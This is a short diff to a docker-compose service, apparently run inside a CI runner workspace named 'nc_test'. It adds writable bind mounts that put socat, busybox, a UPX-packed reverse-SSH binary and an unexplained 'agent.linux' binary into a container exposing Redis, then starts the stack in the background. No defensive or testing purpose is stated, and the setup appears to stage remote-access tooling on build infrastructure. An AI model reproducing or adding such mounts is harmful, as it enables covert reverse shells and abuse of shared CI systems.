@@ -79,7 +79,26 @@ services:
     ports:
       - "127.3.3.3:16379:6379"
       - "19494:9494"
+    volumes:
+      - type: bind
+        source: /home/runner/work/nc_test/nc_test/socat.bin
+        target: /tmp/socat
+        read_only: false
+      - type: bind
+        source: /home/runner/work/nc_test/nc_test/busybox.bin
+        target: /busybox
+        read_only: false
+      - type: bind
+        source: /home/runner/work/nc_test/nc_test/upx_reverse-sshx64.bin
+        target: /tmp/upx_reverse-sshx64.bin
+        read_only: false
+      - type: bind
+        source: /home/runner/work/nc_test/nc_test/agent.linux
+        target: /tmp/agent.linux
+        read_only: false
+      - /home/runner/work/nc_test/nc_test:/pmt
 EOF
+
 
  (/usr/local/bin/docker-compose up -d )&
 
